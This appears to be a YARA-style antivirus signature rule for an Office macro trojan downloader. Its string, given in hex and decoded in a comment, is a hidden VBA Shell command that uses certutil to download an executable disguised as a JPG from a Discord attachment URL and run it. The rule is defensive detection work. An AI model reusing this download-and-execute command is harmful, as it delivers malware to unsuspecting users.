
rule TrojanDownloader_O97M_Powdow_KAAU_MTB{
	meta:
		description = "TrojanDownloader:O97M/Powdow.KAAU!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,01 00 01 00 01 00 00 "
		
	strings :
		$a_01_0 = {3d 20 53 68 65 6c 6c 28 22 63 6d 64 20 2f 63 20 63 65 72 74 75 74 69 6c 2e 65 78 65 20 2d 75 72 6c 63 61 63 68 65 20 2d 73 70 6c 69 74 20 2d 66 20 22 22 68 74 74 70 73 3a 2f 2f 63 64 6e 2e 64 69 73 63 6f 72 64 61 70 70 2e 63 6f 6d 2f 61 74 74 61 63 68 6d 65 6e 74 73 2f 39 38 34 35 32 32 39 30 39 33 37 38 38 30 39 39 34 38 2f 39 38 34 35 32 38 37 34 34 31 38 38 33 34 36 34 32 38 2f 4e 65 74 66 6c 69 78 43 72 61 63 6b 65 72 73 5f 42 73 6a 66 73 74 65 79 2e 6a 70 67 22 22 20 51 77 6a 75 71 6f 6e 63 62 2e 65 78 65 2e 65 78 65 20 26 26 20 51 77 6a 75 71 6f 6e 63 62 2e 65 78 65 2e 65 78 65 22 2c 20 76 62 48 69 64 65 29 } //1 = Shell("cmd /c certutil.exe -urlcache -split -f ""https://cdn.discordapp.com/attachments/984522909378809948/984528744188346428/NetflixCrackers_Bsjfstey.jpg"" Qwjuqoncb.exe.exe && Qwjuqoncb.exe.exe", vbHide)
	condition:
		((#a_01_0  & 1)*1) >=1
 
}